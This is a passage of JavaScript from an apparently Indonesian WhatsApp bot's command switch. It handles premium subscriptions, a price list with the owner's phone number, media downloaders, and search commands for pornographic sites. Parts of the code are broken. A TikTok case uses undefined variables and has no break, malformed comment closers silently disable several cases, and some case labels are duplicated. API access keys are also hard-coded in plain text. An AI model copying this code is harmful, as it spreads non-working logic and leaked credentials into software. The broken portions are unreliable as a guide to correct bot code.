              let premiumnya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
              reply(premiumnya)
              break
//------------------< Premium >-------------------
       case 'premium': 
              if (!isOwner) return reply(mess.only.owner)
              if (args[0] === 'add') {
              if (dim.message.extendedTextMessage != undefined) {
              mentioned = dim.message.extendedTextMessage.contextInfo.mentionedJid

              premium.addPremiumUser(mentioned[0], args[2], _premium)
              reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
                        
              } else {
                            
              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
              reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
}
              } else if (args[0] === 'del') {
              if (dim.message.extendedTextMessage != undefined) {
              mentioned = dim.message.extendedTextMessage.contextInfo.mentionedJid
            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              reply(mess.success)
              } else {
            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              reply(mess.success)
}
              } else {
              reply(mess.wrongFormat)
}
              break
       case 'premiumcheck':
       case 'cekpremium': 
       case 'cekvip':
              if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
              reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
              break
       case 'listprem':
       case 'listpremium':          
              let txt = `「 *PREMIUM USER LIST* 」\n\n`
              let men = [];
              for (let i of _premium){
              men.push(i.id)
              const checkExp = ms(i.expired - Date.now())
              txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
}
              mentions(txt, men, true)
              break
       case 'belipremium':
       case 'buypremium':
       case 'sewabot':
              gopeynya = 'https://i.postimg.cc/vH7H73Mw/IMG-20210828-114455.jpg'
            buff = await getBuffer(gopeynya)
            teksnya = `
┏━━⬣ PRICE LIST 1
┃⬡ PREMIUM 5K/BLN
┃⬡ SEWA 25K/BLN
┃⬡ PERMANEN 100K
┃⬡ PERMANEN + PREM 55K
┃⬡ ALL PERMANEN 120K
┗━━⬣

┏━━⬣ PRICE LIST 2
┃⬡ SC BOT 80K
┃⬡ SC + RECODE 100K
┗━━⬣

┏━━⬣ MINAT? PM
┃⬡ wa.me/6283175068434
┃⬡ Ig @Dimas.edr
┃⬡ Yt Dimas Edr
┗━━⬣
`
  buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: `OWNER`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText: teksnya,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
      break
//------------------< Sticker Cmd >-------------------
       case 'addcmd': 
       case 'setcmd':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = dim.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              reply('tag stickenya')
}
              break
       case 'delcmd':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = dim.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              break
       case 'listcmd':
              let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
//------------------< Downloader/Search/Anime >-------------------
       
       case 'igdl':
       case 'ig':
       case 'instagram':
       case 'instagramdownload':
              if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('instagram')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await igDownloader(`${q}`)
             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, dim) })
             .catch((err) => { reply(String(err)) })
              break
       case 'scplay': 
       case 'soundcloud':
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('soundcloud')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=${setting.lolkey}&url=${q}`)
             .then((data) => { sendMediaURL(from, data.result, dim) })
             .catch((err) => { reply(String(err)) })
              break
       case 'image':
       case 'gimage':
       case 'googleimage':
       if (isGroup) return reply('Private chat only!!!!')
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
              reply(mess.wait)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: dim, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
             break
      case 'ytmp3':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:freply})
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${res[0].judul}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: freply}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: dim, mimetype: 'audio/mp3', filename: res[0].output})
})
            break
     case 'ytmp4':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:freply})
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateV(teks).catch(e => {
            reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${res[0].judul}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: freply}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: dim, mimetype: 'video/mp4', filename: res[0].output})
})
            break
     case 'ytmp4hd':
     case 'ythd':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
            if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)
            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
            if (!isLinkks2) return reply(mess.error.Iv)
            try {
            reply(mess.wait)
            ythd(args[0])
           .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
           .then((a) => {
            if (Number(filesize) >= 200000) return sendMediaURL(from, thumb, 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Kualitas* : 720p\`\`\`
\`\`\`▢ Size* : ${filesizeF}\`\`\`
\`\`\`▢ Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

            const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Kualitas : 720p\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

              sendMediaURL(from, thumb, captionsYtmp4)
              sendMediaURL(from, dl_link,`nih kak`).catch(() => reply(mess.error.api))
})		
})
              } catch (err) {
              reply(`eror`)
}
              break
        case 'google':
              if (!q) return reply(mess.wrongFormat)
              ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=f307ca1dc9824ae89caa976435c03178&url=http://www.google.com/search?q=${q}&oq={q}&aqs=chrome..69i57j0i433i512l2j0i512l2.858j0j4&client=ms-android-oppo&sourceid=chrome-mobile&ie=UTF-8`)
              reply(mess.wait)
              if(q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
              ggs({ 'query': q }).then(results => {
              vars = `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
} 
               dimas.sendMessage(from, ss, image, {thumbnail: Buffer.alloc(0), caption: vars, quoted : dim})
               }).catch(e => {
               console.log(e)
               reply(`${e}`)
})
               break

        case 'mediafire':
               if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
               if (args.length < 1) return reply('Link Nya Mana? ')
               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
               reply(mess.wait)
               teks = args.join(' ')
               res = await mediafireDl(teks)
               result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Nama : ${res[0].nama}\`\`\`
\`\`\`▢ Ukuran : ${res[0].size}\`\`\`
\`\`\`▢ Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
             reply(result)
             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: freply})
             break
       
       case 'tt':
if (!q) return reply('Linknya?')
if (!q.includes('tiktok')) return
reply(mess.error.Iv)
reply(mess.wait)
anu = await TiktokDownloader(`${q}`)
dimyy ='hi.mp4'
kntl = 'hasil.mp4'
fs.writeFileSync(input,await getBuffer(data.result.watermark))
exec(`ffmpeg -i ${dimyy} -b:a 192K -vn  ${kntl}`,(err,res)=> {
if (err) return reply(`${err}`)
dimas.sendMessage(from,{url:'./'+dimyy},audio,{mimetype:'audio/mpeg'})
})
      
       /*case 'ttdl':
       case 'tiktokdl':
       case 'tiktoknowm':
       case 'tiktok2':
              if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                       //if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

if(!q) return reply('Masukkan linknya!')
reply(mess.wait)
//try{
    buff = await getBuffer('https://i.postimg.cc/CMrptwWV/IMG-20210508-WA0105.jpg')
    cap = '[TIKTOK DOWNLOADER]\nBy:Dimas Edr'
/*data = await  fetchJson(`https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${q}`)
buff = await  getBuffer(data.result.media_resources.image.contentUrl)
cap = monospace(`T I K T O K  D O W N L O A D E R`) + '\n\n'
cap += shp + ' Username : ' + data.result.author_metadata.username + '\n'
cap += shp + ' Judul : ' + data.result.media_metadata.title.split(' |')[0] + '\n'
cap += '\n\n'
cap += monospace('V I D E O  I N F O') + '\n\n'
cap += shp + ' Durasi : ' + data.result.media_resources.video.duration + 'Detik \n'
cap += shp + ' Kualitas : ' + data.result.media_resources.video.quality + '\n'
cap += shp + ' Width : ' + data.result.media_resources.video.width + '\n'
cap += shp + ' Height : ' + data.result.media_resources.video.height + '\n'
cap += shp + ' Ratio : ' + data.result.media_resources.video.ratio + '\n'
cap += '\n\n'
cap += monospace('S O U N D  I N F O') + '\n\n'
cap += shp + ' Judul : ' + data.result.media_resources.music.title + '\n'
cap += shp + ' Author : ' + data.result.media_resources.music.authorName + '\n'
cap += shp + ' Durasi : ' + data.result.media_resources.music.duration + 'Detik \n'*/
/*tta = await dimas.prepareMessage(from, buff, image)
gbutsan = [
{buttonId: `${prefix}wm ${q}`, buttonText: {displayText: 'WM'}, type: 1},
{buttonId: `${prefix}nowm ${q}`, buttonText: {displayText: 'NOWM'}, type: 1},
{buttonId: `${prefix}ttaudio ${q}`, buttonText: {displayText: 'MUSIC'}, type: 1}
]
gbuttonan = {
imageMessage: tta.message.imageMessage,
contentText: cap,
footerText: 'Pilih di bawah y kakak',
buttons: gbutsan,
headerType: 4
}
await dimas.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted: dim })
//}catch{
 //   reply('Ada yg eror')
//}
break *\
case 'wm' :
reply(mess.wait)
buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/tiktokwm?apikey=${lol}&url=${q}`)
dimas.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: dim, caption : monospace(`T I K T O K  W I T H  W M`)})
break

case 'tt4' :
reply(mess.wait)
ttms = await fetchJson(`http://zekais-api.herokuapp.com/tiktokmusic?url=${q}`)
sendMediaURL(from, ttms.mp3)
break

case 'nowm' :
  reply(mess.wait)
                    anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tiktok?apikey=${lol}&url=${q}`, {method: 'get'})
                    if (anu.error) return reply(anu.error)
                    tt = `「 *TIKTOK NO WM* 」\n\n*Judul:* ${anu.result.title}\n*Keywords:* ${anu.result.keywords}\n*Desc:* ${anu.result.description}`
 buff = await getBuffer(anu.result.link)
 dimas.sendMessage(from, buff, video, {mimetype: 'video/mp4', quoted: dim,caption : tt})
 break
            /*  if (!q) return reply('Linknya?')
              if (!q.includes('tiktok')) return reply(mess.error.Iv)
              data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${setting.lolkey}&url=${q}`)
              result = `⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n📑 *Desc*: ${data.result.title}`
              buttons = [{buttonId: `${prefix}tt1 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result.thumbnail))
              imageMsg = ( await dimas.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,
              contentText:`${result}`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break */
      case 'tt1': 

             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break

  case 'xnxxsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xnxx':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await dimas.sendMessage(from, thumbnail, image, { quoted: freply , caption: ini_txt })
                    break

              /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dimas-chan02.github.io`)
       case 'tiktok':
        case 'tiktokdl':
        case 'tiktoknowm':
              if (!q) return reply('Linknya?')
              if (!q.includes('tiktok')) return reply(mess.error.Iv)
              data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=dimasGans&url=${q}`)
              result = `⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n?? *Desc*: ${data.result.title}`
              buttons = [{buttonId: `${prefix}tt1 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result.thumbnail))
              imageMsg = ( await dimas.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,
              contentText:`${result}`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
      case 'tt1': 

             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break       
      case 'ttaudio': 
      case 'tiktokmusic': 
      case 'tiktokaudio':
              reply(mess.wait)
             if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
             ini_link = args[0]
             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${setting.lolkey}&url=${ini_link}`)
             dimas.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: dim })
             break
      case 'fb':
      case 'facebook':
             if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
             if (!q) return
                fblink = args[0]
             reply(mess.wait)
             try {
             anu = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${setting.lolkey}&url=${fblink}`)
             sendMediaURL(from, anu.result)
             } catch (e) {
             console.log(e)
             reply(`${e}`)
}
             break
      case 'twitter':
             if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
             if (!q) return reply('Linknya?')
             ten = args[0]
             var res = await twitterGetUrl(`${ten}`)
            .then(g => {
             ren = `${g.download[2].url}`
             sendMediaURL(from,ren,'Done')
})
             break
             case `brainly`:
       //await limitAdd(serial)
            if (args.length >= 2){
                const BrainlySearch = require('./lib/brainly')
                let tanya = body.slice(9)
                let jum = Number(tanya.split('.')[1]) || 2
                if (jum > 10) return dimas.reply('Max 10!')
                if (Number(tanya[tanya.length-1])){
                    tanya
                }
                dimas.reply(`➸ *Pertanyaan* : ${tanya.split('.')[0]}\n\n➸ *Jumlah jawaban* : ${Number(jum)}`)
                await BrainlySearch(tanya.split('.')[0],Number(jum), function(res){
                    res.forEach(x=>{
                        if (x.jawaban.fotoJawaban.length == 0) {
                            dimas.reply(`➸ *Pertanyaan* : ${x.pertanyaan}\n\n➸ *Jawaban* : ${x.jawaban.judulJawaban}\n`)
                        } else {
                            dimas.reply(`➸ *Pertanyaan* : ${x.pertanyaan}\n\n➸ *Jawaban* 〙: ${x.jawaban.judulJawaban}\n\n➸ *Link foto jawaban* : ${x.jawaban.fotoJawaban.join('\n')}`)
                        }
                    })
                })
            } else {
                dimas.reply(`Usage :\n!brainly [pertanyaan] [.jumlah]\n\nEx : \n!brainly NKRI .2`)
            }
            break
      case 'brainly':
             reply(mess.wait)
             brainly(args.join(" ")).then(res => {
             hmm = '────────────\n'
             for (let Y of res.data) {
             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
}
             reply(hmm)
             console.log(res)
})
             break
             case 'cuaca':
                //if (!isRegistered) return reply( ind.noregis())
               // if (isLimit(sender)) return reply(ind.limitend(pusname))
               // if (isBanned) return reply('Maaf kamu sudah terbenned!')
                reply(mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Tempat : ${get_result.tempat}\n`
                    ini_txt += `Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `Angin : ${get_result.angin}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `Suhu : ${get_result.suhu}\n`
                    ini_txt += `Udara : ${get_result.udara}\n`
                    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
                    dimas.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: dim })
                    reply(ini_txt)
                    break
      case 'ssweb':
             if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
             reply(mess.wait)
             ini_link = args[0]
             ini_buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/tools/ssweb?url=${ini_link}&apikey=hardianto`)
             await dimas.sendMessage(from, ini_buffer, image, { quoted: dim })
             break
       case 'nhentaipdf':
             if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
             if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
             if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
             try {
             henid = args[0]
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
             get_result = get_result.result
             get_info = get_result.info
             teks = `*Doujinshi Downloader*
             
📜 Title Romaji : ${get_result.title_romaji}
📃 Title Native : ${get_result.title_native}
🐤 Character : ${get_info.characters.join(", ")}\n`
             ini_image = await getBuffer(get_result.image[0])
             dimas.sendMessage(from, ini_image, image, { caption: teks, quoted: dim, thumbnail: Buffer.alloc(0) })
             reply(mess.wait)
             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${setting.lolkey}`)
             pdf = await getBuffer(anu.result)
             dimas.sendMessage(from, pdf, document, { quoted: dim, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
       case 'nhentai':
              if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
              reply(mess.wait)
              henid = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
              get_result = get_result.result
              ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
              ini_txt += `Title Native : ${get_result.title_native}\n`
              ini_txt += `Read Online : ${get_result.read}\n`
              get_info = get_result.info
              ini_txt += `Parodies : ${get_info.parodies}\n`
              ini_txt += `Character : ${get_info.characters.join(", ")}\n`
              ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
              ini_txt += `Artist : ${get_info.artists}\n`
              ini_txt += `Group : ${get_info.groups}\n`
              ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
              ini_txt += `Categories : ${get_info.categories}\n`
              ini_txt += `Pages : ${get_info.pages}\n`
              ini_txt += `Uploaded : ${get_info.uploaded}\n`
              reply(ini_txt)
              break
       case 'manga':
              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              reply(mess.wait)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${setting.lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Id : ${get_result.id}\n`
              ini_txt += `Id MAL : ${get_result.idMal}\n`
              ini_txt += `Title : ${get_result.title.romaji}\n`
              ini_txt += `English : ${get_result.title.english}\n`
              ini_txt += `Native : ${get_result.title.native}\n`
              ini_txt += `Format : ${get_result.format}\n`
              ini_txt += `Chapters : ${get_result.chapters}\n`
              ini_txt += `Volume : ${get_result.volumes}\n`
              ini_txt += `Status : ${get_result.status}\n`
              ini_txt += `Source : ${get_result.source}\n`
              ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
              ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
              ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
              ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
              ini_txt += `Score : ${get_result.averageScore}%\n`
              ini_txt += `Characters : \n`
              ini_character = get_result.characters.nodes
              for (var x of ini_character) {
              ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
              ini_txt += `\nDescription : ${get_result.description}`
              buff = await getBuffer(get_result.coverImage.large)
              buttons = [{buttonId: `!menu`,buttonText:{displayText: `Back To Menu`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText: ini_txt,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
         break
       case 'doujindesu':
             if (!q) return reply(mess.wrongFormat)
             reply(mess.wait)
             try {
             doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
             let { data } = await doujinnya
             xixixai = `*Doujindesu Search*\n`
             for (let i = 0; i < data.length; i++) {
             xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
}
             buffer = await getBuffer(data[0].thumb)
             dimas.sendMessage(from, buffer, image, {caption: xixixai, quoted: freply})
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
      case 'anime':
             if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
             reply(mess.wait)
             query = args.join(" ")
